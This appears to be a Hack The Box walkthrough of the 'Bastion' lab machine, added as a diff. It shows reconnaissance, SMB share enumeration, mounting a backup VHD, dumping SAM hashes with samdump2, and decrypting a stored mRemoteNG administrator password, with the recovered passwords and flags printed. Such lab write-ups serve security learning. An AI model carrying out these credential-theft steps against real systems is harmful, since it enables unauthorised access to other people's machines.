@@ -1,0 +1,189 @@
+								 -----------------------
+								| B A S T I O N   B O X |
+								 -----------------------
+---------------------------------
+	   INFORMATION GATHERING | 
+---------------------------------
+
+The first thing we need to do is to gather information about our targer, in this case, 10.10.10.134:
+	#: nmap -sC -sV 10.10.10.134 -oA bastion_scan
+
+We will see that our target has some ports up (22,135,139 and 445), 445 displays a bunch of information where we can see it can be a vulnerable place to exploit to our target.
+
+	445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+	Host script results:
+	|_clock-skew: mean: -2h39m50s, deviation: 1h09m14s, median: -1h59m52s
+	| smb-os-discovery: 
+	|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+	|   Computer name: Bastion
+	|   NetBIOS computer name: BASTION\x00
+	|   Workgroup: WORKGROUP\x00
+	|_  System time: 2019-08-04T00:35:30+02:00
+	| smb-security-mode: 
+	|   account_used: guest
+	|   authentication_level: user
+	|   challenge_response: supported
+	|_  message_signing: disabled (dangerous, but default)
+	| smb2-security-mode: 
+	|   2.02: 
+	|_    Message signing enabled but not required
+	| smb2-time: 
+	|   date: 2019-08-03 22:35:28
+	|_  start_date: 2019-08-03 21:46:17
+
+
+
+After looking for smb auxiliary payloads to gather information about our target, I decide to use an auxiliary payload to gather information about the smb share on the target:
+	#: msf5 auxiliary(scanner/smb/smb_enumshares) > set RHOSTS 10.10.10.134
+
+	[+] 10.10.10.134:445      - ADMIN$ - (DS) Remote Admin
+	[+] 10.10.10.134:445      - Backups - (DS) 
+	[+] 10.10.10.134:445      - C$ - (DS) Default share
+	[+] 10.10.10.134:445      - IPC$ - (I) Remote IPC
+	[*] 10.10.10.134:         - Scanned 1 of 1 hosts (100% complete)
+
+
+
+At this point, we find out a Backup (DS) that may be public access, so we stablish a connection via smbclient -> smbclient //10.10.10.134/Backups
+where it will ask us about root's password, but we can type any random password since is a Backup DS and is public.
+
+(1) Once we're logged in, we can see the main Directories and files on DS, we start exploring around to find out some information about the users, admins...
+
+	(1)
+	..
+	WindowsImageBackup                  D        0  Fri Feb 22 12:44:02 2019  
+
+	(2)
+	..
+	L4mpje-PC                           D        0  Fri Feb 22 12:45:32 2019
+
+
+
+(2) Inside WindowsImageBackup we find an User (L4mpje-PC), our main goal now is to get the hash trough SYSTEM and SAM files to exploit the target
+
+Once we're inside L4mpje-PC's folder we reach our first trouble, 
+
+	
+	smb: \WindowsImageBackup\L4mpje-PC\> dir
+	  .                                   D        0  Fri Feb 22 12:45:32 2019
+	  ..                                  D        0  Fri Feb 22 12:45:32 2019
+       (*)Backup 2019-02-22 124351            D        0  Fri Feb 22 12:45:32 2019
+	  Catalog                             D        0  Fri Feb 22 12:45:32 2019
+	  MediaId                             A       16  Fri Feb 22 12:44:02 2019
+	  SPPMetadataCache                    D        0  Fri Feb 22 12:45:32 2019
+
+			7735807 blocks of size 4096. 2772355 blocks available
+	smb: \WindowsImageBackup\L4mpje-PC\> cd Backup 2019-02-22 124351\
+	cd \WindowsImageBackup\L4mpje-PC\Backup\: NT_STATUS_OBJECT_NAME_NOT_FOUND
+
+
+-------------------------------------------
+	   I N F O    M A N A G E M E N T  |
+-------------------------------------------
+
+
+The Backup Directory may contain vulnerable information but we can't get into it since we're getting an error whenever we try to change our directory, so the best option here is to mount the Directory on our Kali Machine to gain access via our local machine:
+
+
+	#: mount -t cifs //10.10.10.134/Backups/WindowsImageBackup/L4mpje-PC/'Backup 2019-02-22 124351' ~/Private/Hackthebox/Bastion/smb_mount
+
+
+
+Once we mount our Directory we're able to explore it to find the main vulnerabilities (Windows Credentials) but when we reach the Backup Directory we find some vhd files, which is a file format which represents a virtual hard disk driver, so it may contain disk partitions and a file system which can contain folders and files. (Used as the hard disk of a Virtual machine), so we need to mount it in our kali machine:
+
+	#: guestmount --add /root/Private/Hackthebox/Bastion/smb_mount/WindowsImageBackup/L4mpje-PC/'Backup 2019-02-22 124351'/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro ~/Private/Hackthebox/Bastion/vhd_mount/
+
+
+FINALLY WE'RE IN, we reached the point we were looking for, L4Mpje session, so we're able to exploit the hash via SYSTEM and SAM:
+	
+	#: ~/Private/Hackthebox/Bastion/vhd_mount/Windows/System32/config# samdump2 SYSTEM SAM
+	
+	*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+	*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+	[ L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:(((26112010952d963c8dc4217daec986d9)))::: ] <--- HASH 
+
+
+--------------------------
+	   E X P L O I T  |
+--------------------------
+
+So we manage to crack it and  we get L4mpje's password (bureaulampje):
+
+	#: ssh L4mpje@10.10.10.134
+	password?: bureaulampje
+	(LOGGED IN :D)
+
+Now is easy peasy to find user's flag, which it can be found in Desktop.
+
+
+	l4mpje@BASTION C:\Users\L4mpje\Desktop>more user.txt                                                                            
+	9bfe57d5c3309db3a151772f9d86c6cd 
+
+
+
+After finding our first flag, we look for PrivEsc on specific software vulnerabilities, so we look for Program Files(x86):
+
+
+	..
+	22-02-2019  15:01    <DIR>          mRemoteNG 
+	..
+
+mRemoteNG is an open sourrce remote connections management tool, but the main problem about this tool is that the connection user information can be obtained by the config files, so at this point we look for the log files on the AppData folder:
+ 
+
+	 Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG 
+		
+
+	22-02-2019  15:03    <DIR>          .                                                                                           
+	22-02-2019  15:03    <DIR>          ..                                                                                          
+    (*) 22-02-2019  15:03             6.316 confCons.xml                                                                       
+	22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup                                                     
+	22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup                                                     
+	22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup                                                     
+	22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup                                                     
+	22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup                                                     
+	22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup                                                     
+	22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup                                                     
+	22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup                                                     
+	22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup                                                     
+	22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup                                                     
+	22-02-2019  15:03                51 extApps.xml                                                                                 
+	22-02-2019  15:03             5.217 mRemoteNG.log                                                                               
+	22-02-2019  15:03             2.245 pnlLayout.xml 
+
+(*) confCons.xml is our main objective, since it may contain the Log information, and we're right:
+
+ 
+	<Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Userna
+	me="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
+
+
+Now we need to look for a tool or cracker to decrypt our password and gain Administrator access on our target machine, I looked for some help on github and I found an amazing cracker -> https://github.com/mRemoteNG/mRemoteNG
+
+So now we are able to crack our crypted password and get it on plain text: 
+
+
+	#:~/Private/Hackthebox/Bastion/mremoteng-decrypt# python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
+	Password: thXLHM96BeKL0ER2
+
+At this point we just need to loggin as the administrator and get our hash: 
+	
+	#: ssh Administrator@10.10.10.134
+
+	administrator@BASTION C:\Users\Administrator\Desktop>more root.txt                                                              
+	958850b91811676ed6620a9c430e65c8
+
+-----------------
+CONGRATULATIONS! |
+-----------------
+
+
+     __   __   _______   ______   __    __  ________   _______
+    |  |_|  | |   _   | |  ____| |  |  / / | _______| |  ____ )
+    |       | |  |_|  | | |      |  |_/ /  | |_____   | |    ) )
+    |   _   | |   _   | | |____  |      \  | |______  | |____) )
+    |__| |__| |__| |__| |______| |__/\___\ |________| |_______)
+ 
+
